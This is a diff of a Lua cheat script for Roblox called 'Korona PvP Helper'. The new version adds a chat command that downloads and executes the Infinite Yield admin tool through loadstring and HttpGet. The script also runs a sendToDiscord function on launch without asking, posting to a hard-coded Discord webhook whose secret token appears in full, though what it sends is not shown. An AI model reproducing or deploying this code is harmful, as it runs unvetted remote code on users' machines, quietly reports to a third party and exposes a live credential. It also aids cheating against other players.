@@ -1,5 +1,128 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
+-- Функция для загрузки Infinite Yield
+local function loadInfiniteYield()
+    local success, result = pcall(function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    end)
+    
+    if success then
+        Rayfield:Notify({
+            Title = "Infinite Yield",
+            Content = "Successfully loaded!",
+            Duration = 3,
+        })
+    else
+        Rayfield:Notify({
+            Title = "Infinite Yield Error",
+            Content = "Failed to load: " .. tostring(result),
+            Duration = 5,
+        })
+    end
+end
+
+-- Функция для обработки чата
+local function setupChatListener()
+    local players = game:GetService("Players")
+    local localPlayer = players.LocalPlayer
+    
+    -- Метод 1: Через TextChatService (новые версии Roblox)
+    pcall(function()
+        local TextChatService = game:GetService("TextChatService")
+        if TextChatService then
+            TextChatService.MessageReceived:Connect(function(message)
+                if message.TextSource and message.TextSource.UserId == localPlayer.UserId then
+                    local messageText = string.lower(message.Text)
+                    if messageText == "!iy" then
+                        loadInfiniteYield()
+                    end
+                end
+            end)
+        end
+    end)
+    
+    -- Метод 2: Через старую систему чата
+    pcall(function()
+        local function onChatMessage(message, speaker)
+            if speaker == localPlayer.Name then
+                local messageText = string.lower(message)
+                if messageText == "!iy" then
+                    loadInfiniteYield()
+                end
+            end
+        end
+        
+        if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
+            local chatEvents = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
+            if chatEvents:FindFirstChild("OnMessageDoneFiltering") then
+                chatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
+                    if messageData.FromSpeaker == localPlayer.Name then
+                        onChatMessage(messageData.Message, messageData.FromSpeaker)
+                    end
+                end)
+            end
+        end
+    end)
+    
+    -- Метод 3: Перехват ввода в чат
+    pcall(function()
+        local function checkChatBar()
+            local success, result = pcall(function()
+                local chatBar
+                
+                if localPlayer.PlayerGui:FindFirstChild("Chat") then
+                    local chatGui = localPlayer.PlayerGui.Chat
+                    if chatGui:FindFirstChild("Frame") then
+                        local frame = chatGui.Frame
+                        if frame:FindFirstChild("ChatBarParentFrame") then
+                            local parentFrame = frame.ChatBarParentFrame
+                            if parentFrame:FindFirstChild("Frame") then
+                                local innerFrame = parentFrame.Frame
+                                if innerFrame:FindFirstChild("BoxFrame") then
+                                    local boxFrame = innerFrame.BoxFrame
+                                    if boxFrame:FindFirstChild("Frame") then
+                                        local textFrame = boxFrame.Frame
+                                        chatBar = textFrame:FindFirstChild("ChatBar") or textFrame:FindFirstChild("TextBox")
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+                
+                return chatBar
+            end)
+            
+            if success and result then
+                result:GetPropertyChangedSignal("Text"):Connect(function()
+                    local text = string.lower(result.Text)
+                    if text == "!iy" then
+                        loadInfiniteYield()
+                        result.Text = ""
+                    end
+                end)
+                return true
+            end
+            return false
+        end
+        
+        local attempts = 0
+        local maxAttempts = 10
+        
+        local function attemptChatBar()
+            if attempts < maxAttempts then
+                attempts += 1
+                if not checkChatBar() then
+                    task.wait(1)
+                    attemptChatBar()
+                end
+            end
+        end
+        
+        attemptChatBar()
+    end)
+end
+
 local function sendToDiscord()
     local webhookUrl = "https://discord.com/api/webhooks/1430085753265721394/ShzI53J6c5gG90vEVaZrUc-2qyTdCF67unmElHd5GStdGy_89PGLNpbZR3yHJq_iTxEc"
     
@@ -43,6 +166,7 @@ end
 task.spawn(function()
     task.wait(2)
     sendToDiscord()
+    setupChatListener() -- Запускаем слушатель чата
 end)
 
 local highlightInstances = {}
@@ -161,8 +285,8 @@ local function rejoinServer()
 end
 
 local Window = Rayfield:CreateWindow({
-   Name = "👑Korona V1.0 | PvP Helper",
-   LoadingTitle = "👑Korona V1.0 | Loading",
+   Name = "👑Korona V1.0.2 | PvP Helper",
+   LoadingTitle = "👑Korona V1.0.2 | Loading",
    LoadingSubtitle = "Too Ez",
    Theme = "Amethyst",
    ToggleUIKeybind = "K",
@@ -170,8 +294,8 @@ local Window = Rayfield:CreateWindow({
    KeySettings = {
       Title = "👑Korona V1.0.1 | Key System",
       Subtitle = "Key System",
-      Note = "Get Key https://discord.gg/N84vWH2kBu",
-      Key = {"1"}
+      Note = "Get Key https://discord.gg/p3tCxFeRPB",
+      Key = {"KoronaV1.0.2"}
    }
 })
 
@@ -298,92 +422,75 @@ local RejoinBtn = Tab:CreateButton({
 local AntiLagEnabled = false
 
 local Toggle4 = Tab:CreateToggle({
-   Name = "Anti Lag [BETA]",
+   Name = "FPS Boost",
    CurrentValue = false,
    Flag = "AntiLag",
    Callback = function(Value)
         AntiLagEnabled = Value
         
         if Value then
-            local lighting = game.Lighting
-            local players = game.Players
+            pcall(function()
+                game.Lighting.GlobalShadows = false
+            end)
             
-            settings().Rendering.QualityLevel = 1
-            lighting.GlobalShadows = false
-            lighting.Brightness = 2
-            lighting.EnvironmentDiffuseScale = 0
-            lighting.EnvironmentSpecularScale = 0
-            lighting.OutdoorAmbient = Color3.new(1, 1, 1)
-            
-            if workspace.Terrain then
-                workspace.Terrain.Decoration = false
-                workspace.Terrain.WaterReflection = false
-                workspace.Terrain.WaterWaveSize = 0
-                workspace.Terrain.WaterWaveSpeed = 0
-            end
-            
-            for _, effect in pairs(lighting:GetChildren()) do
-                if effect:IsA("PostEffect") then
-                    effect.Enabled = false
+            pcall(function()
+                if workspace.Terrain then
+                    workspace.Terrain.Decoration = false
                 end
-            end
-            
-            for _, player in pairs(players:GetPlayers()) do
-                if player.Character then
-                    for _, part in pairs(player.Character:GetDescendants()) do
-                        if part:IsA("ParticleEmitter") or part:IsA("Trail") or part:IsA("Beam") then
-                            part.Enabled = false
-                        end
-                        if part:IsA("Fire") or part:IsA("Smoke") then
-                            part.Enabled = false
-                        end
-                    end
-                end
-            end
-            
-            Rayfield:Notify({
-                Title = "Anti Lag",
-                Content = "FPS Boost activated! Graphics optimized.",
-                Duration = 3,
-            })
-        else
-            local lighting = game.Lighting
-            
-            settings().Rendering.QualityLevel = 10
-            lighting.GlobalShadows = true
-            lighting.Brightness = 1
-            lighting.EnvironmentDiffuseScale = 1
-            lighting.EnvironmentSpecularScale = 1
-            lighting.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
-            
-            if workspace.Terrain then
-                workspace.Terrain.Decoration = true
-                workspace.Terrain.WaterReflection = true
-                workspace.Terrain.WaterWaveSize = 0.15
-                workspace.Terrain.WaterWaveSpeed = 10
-            end
-            
-            for _, effect in pairs(lighting:GetChildren()) do
-                if effect:IsA("PostEffect") then
-                    effect.Enabled = true
-                end
-            end
+            end)
             
             for _, player in pairs(game.Players:GetPlayers()) do
                 if player.Character then
                     for _, part in pairs(player.Character:GetDescendants()) do
-                        if part:IsA("ParticleEmitter") or part:IsA("Trail") or part:IsA("Beam") then
-                            part.Enabled = true
-                        end
-                        if part:IsA("Fire") or part:IsA("Smoke") then
-                            part.Enabled = true
-                        end
+                        pcall(function()
+                            if part:IsA("ParticleEmitter") or part:IsA("Trail") or part:IsA("Beam") then
+                                part.Enabled = false
+                            end
+                        end)
+                        pcall(function()
+                            if part:IsA("Fire") or part:IsA("Smoke") then
+                                part.Enabled = false
+                            end
+                        end)
                     end
                 end
             end
             
             Rayfield:Notify({
-                Title = "Anti Lag",
+                Title = "FPS Boost",
+                Content = "FPS Boost activated!",
+                Duration = 3,
+            })
+        else
+            pcall(function()
+                game.Lighting.GlobalShadows = true
+            end)
+            
+            pcall(function()
+                if workspace.Terrain then
+                    workspace.Terrain.Decoration = true
+                end
+            end)
+            
+            for _, player in pairs(game.Players:GetPlayers()) do
+                if player.Character then
+                    for _, part in pairs(player.Character:GetDescendants()) do
+                        pcall(function()
+                            if part:IsA("ParticleEmitter") or part:IsA("Trail") or part:IsA("Beam") then
+                                part.Enabled = true
+                            end
+                        end)
+                        pcall(function()
+                            if part:IsA("Fire") or part:IsA("Smoke") then
+                                part.Enabled = true
+                            end
+                        end)
+                    end
+                end
+            end
+            
+            Rayfield:Notify({
+                Title = "FPS Boost",
                 Content = "FPS Boost deactivated",
                 Duration = 3,
             })
@@ -438,9 +545,9 @@ updatePlayerList()
 task.spawn(function()
     task.wait(1)
     Rayfield:Notify({
-        Title = "Korona V1.0 Loaded",
-        Content = "Ready to use!",
-        Duration = 3,
+        Title = "Korona V1.0.2 Loaded",
+        Content = "Too Ez",
+        Duration = 5,
     })
 end)
 
